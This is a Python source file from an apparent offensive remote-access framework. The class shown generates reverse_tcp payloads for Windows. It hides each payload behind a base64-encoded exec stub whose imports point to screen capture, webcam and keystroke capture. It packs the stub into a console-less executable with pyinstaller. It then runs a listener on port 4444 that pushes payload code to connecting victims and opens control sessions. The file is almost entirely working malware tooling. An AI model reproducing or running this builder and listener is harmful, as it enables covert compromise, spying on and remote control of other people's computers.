"""
MIT License

Copyright (c) 2024 NoticedCloud348

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.
"""

import socket
import os
from base64 import b64encode
import platform
import subprocess
import importlib

from Lib.Debugger import info, warning, error

class NCEXP:
    def __init__(self) -> None:
        info("No payload selected. Setting payload to Windows/NoticedCloud/reverse_tcp")
        self.LHOST: str = "0.0.0.0"
        self.EXPLOIT: str = "Server/Exploits/NoticedCloud/"
        self.LPORT: int = 4444
        self.payload: str = "Server/Payloads/Windows/NoticedCloud/reverse_tcp"
        self.commands: dict = {"exploit": "runs the exploit", "run": "runs the exploit", "payload_gen": "generates a payload"}

    def exec(self, command: str) -> any:
        if command.startswith("payload_gen"):
            self.payload_gen(command)

        elif command == "exploit" or command == "run":
            self.exploit()

        else:
            return 1

    def _load_template(self) -> str:
        path = os.path.join(self.EXPLOIT, "_NCEXP", "Template.py")
        with open(path, "r") as f:
            return f.read()

    def _load_imports(self) -> str:
        path = os.path.join(self.EXPLOIT, "_NCEXP", "imports.py")
        with open(path, "r") as f:
            return f.read()

    def check_wine(self) -> bool:
        try:
            result = subprocess.run(["wine", "--version"], capture_output=True, text=True)

            if result.returncode == 0 and "wine" in result.stdout:
                return True
            else:
                return False
        except FileNotFoundError:
            return False


    def compile_with_docker(self, filename: str) -> None:
        docker_exists = os.system("docker --version")

        if docker_exists != 0:
            error("Docker is not installed or not available in the PATH")
            return

        dockerfile_content: str = (
            open(self.EXPLOIT + "_NCEXP/docker.dockerfile", "r")
            .read()
            .replace("{{filename}}", filename)
        )

        with open("Dockerfile", "w") as dockerfile:
            dockerfile.write(dockerfile_content)

        try:
            if os.system("docker build -t python-compiler .") != 0:
                error("Failed to build Docker image")
                return

            if os.system(f"docker run --rm -v %cd%:/app python-compiler") != 0:
                error("Failed to run Docker container")
                return

        finally:
            os.remove("Dockerfile")
            os.system("docker rmi python-compiler")
            os.remove(f"{filename}.py")
            os.remove(f"{filename}.spec")

    def compile_payload(self, name, imports):
        system: str = platform.system()  

        if imports == "":
            if system == "Windows":
                self.compile_with_docker(name)

            else:
                os.system(f"pyinstaller {name}.py --icon=Lib/icon.ico --name {name} --onefile --noconsole --hidden-import PIL --hidden-import GPUtil")
                os.remove(f"{name}.py")
                os.remove(f"{name}.spec")
        else:
            if system == "Windows":
                os.system(f"pyinstaller {name}.py --icon=Lib/icon.ico --name {name} --onefile --noconsole --hidden-import PIL --hidden-import GPUtil")

            else:
                if not self.check_wine():
                    error("Please install wine to create a windows executable")
                    return

                os.system(f"wine pyinstaller {name}.py --icon=Lib/icon.ico --name {name} --onefile --noconsole --hidden-import PIL --hidden-import GPUtil")


            os.remove(f"{name}.py")
            os.remove(f"{name}.spec")


    def payload_gen(self, command) -> None:
        if not self.exploit == None:
            if len(command.split()) < 2:
                error("Please specify a file name")

            elif len(command.split()) < 3:
                error("Please specify a an os: W(windows), L(linux), RW(Raw Windows) or RL(Raw Linux)")

            else:
                imports: str = ""
                if command.split()[2].lower() in ["w", "rw"]:
                    print(os.getcwd())
                    imports: str = self._load_imports()

                payload: str = self._load_template()

                final_payload: str = (
                    payload
                    .replace("{{ip}}", self.LHOST)
                    .replace("{{port}}", str(self.LPORT))
                    .replace("{{imports}}", str(imports))
                )
                if not command.split()[2].lower().startswith("r"):
                    final_payload: str = b64encode(final_payload.encode()).decode()

                    final_payload: str = f"""\
from base64 import b64decode
import socket
import os
import sys
from PIL import ImageGrab
import io
import pickle
import cv2
import keyboard
import subprocess

exec(b64decode(b'{final_payload}').decode())
"""

                name: str = command.split()[1]
                with open(f"{name}.py", "w") as f:
                    f.write(final_payload)

                if not command.split()[2].lower().startswith("r"):
                    self.compile_payload(name, imports)


    def set(self, *args, **kwargs) -> None:
        if "payload" in args[0]:
            if os.path.exists("Server/Payloads/"+args[0]["payload"]+".py"):
                self.payload: str = "Server/Payloads/"+args[0]["payload"]
                info(f"Payload set to {self.payload}")
            else:
                payload = args[0]["payload"]
                error(f"Payload {payload} does not exist")

        elif "lhost" in args[0]:
            self.LHOST = args[0]["lhost"]
            info(f"LHOST set to {self.LHOST}")
        elif "lport" in args[0]:
            try:
                self.LPORT = int(args[0]["lport"])
            except:
                error(f"Invalid LHOST {self.LPORT}")
        else:
            warning("Argument not valid")

    def get_payload(self, payload) -> str:
        if not os.path.exists(f"{payload}.py"):
            return False

        module_name = payload.replace("/", ".")
        parts = module_name.split(".")
        class_name = parts[-1]

        try:
            module = importlib.import_module(module_name)
            payload_class = getattr(module, class_name)
            self.clientpayload = payload_class()
            return self.clientpayload
        except Exception as e:
            print(f"Failed to load payload: {e}")
            return False

    def get_options(self) -> dict:
        return {
            "lhost": self.LHOST,
            "lport": self.LPORT,
            "payload": self.payload[16:]
        }

    def options(self) -> None:
        print(f"""
{'CONTENT':<12} {'VALUE':<15} {'REQUIRED':<10}

{'-----------':<12} {'---------------':<15} {'----------':<10}

{'LHOST':<12} {self.LHOST:<15} {'True':>10}
{'LPORT':<12} {self.LPORT:<15} {'True':>10}

{'PAYLOAD':<12} {self.payload[16:]}
""")


    def exploit(self) -> None:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as st:
            st.bind((self.LHOST, self.LPORT))
            st.listen(1)
            info(f"Server listening on {self.LHOST}:{self.LPORT}")
            try:
                conn, addr = st.accept()
                size = os.stat(self.payload+".py").st_size
                info("Payload size:", size)
                clientpayload = "Client/"+"/".join(self.payload.split("/")[1:])

                with open(self.payload+".py", "r") as f:
                    payload = f.read()

                with open(clientpayload+".py", "rb") as f:
                    while True:
                        data: bytes = f.read(1024)
                        if not data:
                            conn.send(b"{fine}")
                            break
                        conn.sendall(data)
                        conn.recv(1024)

                info("Payload sended")
                info("Session created")
                payload = self.get_payload(self.payload)
                try:
                    payload.run(conn, addr)
                except Exception as e:
                    print(e)
            except socket.timeout:
                error("Connection timed out")
            except Exception as e:
                error(e)
